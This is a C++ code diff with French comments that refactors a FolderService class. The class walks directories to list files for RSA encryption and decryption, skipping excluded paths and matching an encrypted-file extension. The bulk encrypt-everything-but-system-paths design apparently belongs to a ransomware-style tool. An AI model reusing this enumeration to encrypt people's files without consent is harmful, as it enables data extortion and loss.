@@ -48,13 +48,7 @@ std::vector<std::string> FolderService::list_files_for_encryption() {
             std::string path = it->path().string();
 
             // Vérifie si le chemin contient l'une des parties de chemins à écarter
-            bool exclude = false;
-            for (const std::string& exclude_path : m_exclude_paths) {
-                if (path.find(exclude_path) != std::string::npos) {
-                    exclude = true;
-                    break;
-                }
-            }
+            bool exclude = is_excluded(path);
 
             if (!exclude) {
                 m_data_files.push_back(path);
@@ -77,9 +71,15 @@ std::vector<std::string> FolderService::list_files_for_decryption() {
             list_files_in_directory_for_decryption(it->path());
         } else if (boost::filesystem::is_regular_file(it->path())) {
             std::string path = it->path().string();
-            if(path.find(RSAEncryptor::ENCRYPTED_FILES_EXTENSION) != std::string::npos) {
-                m_data_files.push_back(path);
-                std::cout<<"[File to decrypt]: "<<path<<std::endl;
+
+            // Vérifie si le chemin contient l'une des parties de chemins à écarter
+            bool exclude = is_excluded(path);
+
+            if (!exclude) {
+                if(path.find(RSAEncryptor::ENCRYPTED_FILES_EXTENSION) != std::string::npos) {
+                    m_data_files.push_back(path);
+                    std::cout<<"[File to decrypt]: "<<path<<std::endl;
+                }
             }
         }
     }
@@ -93,13 +93,7 @@ void FolderService::list_files_in_directory_for_encryption(boost::filesystem::pa
             std::string path = it->path().string();
 
             // Vérifie si le chemin contient l'une des parties de chemins à écarter
-            bool exclude = false;
-            for (const std::string& exclude_path : m_exclude_paths) {
-                if (path.find(exclude_path) != std::string::npos) {
-                    exclude = true;
-                    break;
-                }
-            }
+            bool exclude = is_excluded(path);
 
             if (!exclude) {
                 if (boost::filesystem::is_regular_file(it->path())) {
@@ -122,9 +116,15 @@ void FolderService::list_files_in_directory_for_decryption(boost::filesystem::pa
         for (boost::filesystem::directory_iterator it(directory); it != boost::filesystem::directory_iterator(); ++it) {
                 if (boost::filesystem::is_regular_file(it->path())) {
                     std::string path = it->path().string();
-                    if(path.find(RSAEncryptor::ENCRYPTED_FILES_EXTENSION) != std::string::npos) {
-                        m_data_files.push_back(path);
-                        std::cout<<"[File to decrypt]: "<<path<<std::endl;
+
+                    // Vérifie si le chemin contient l'une des parties de chemins à écarter
+                    bool exclude = is_excluded(path);
+
+                    if (!exclude) {
+                        if(path.find(RSAEncryptor::ENCRYPTED_FILES_EXTENSION) != std::string::npos) {
+                            m_data_files.push_back(path);
+                            std::cout<<"[File to decrypt]: "<<path<<std::endl;
+                        }
                     }
                 } else if (boost::filesystem::is_directory(it->path())) {
                     list_files_in_directory_for_decryption(it->path());
@@ -133,4 +133,16 @@ void FolderService::list_files_in_directory_for_decryption(boost::filesystem::pa
     } catch (const boost::filesystem::filesystem_error& e) {
         std::cout<<"[LIST-FILES-ERROR]: "<<e.what()<<std::endl;
     }
+}
+
+bool FolderService::is_excluded(std::string path) {
+    bool exclude = false;
+    for (const std::string& exclude_path : m_exclude_paths) {
+        if (path.find(exclude_path) != std::string::npos) {
+            exclude = true;
+            break;
+        }
+    }
+
+    return exclude;
 }
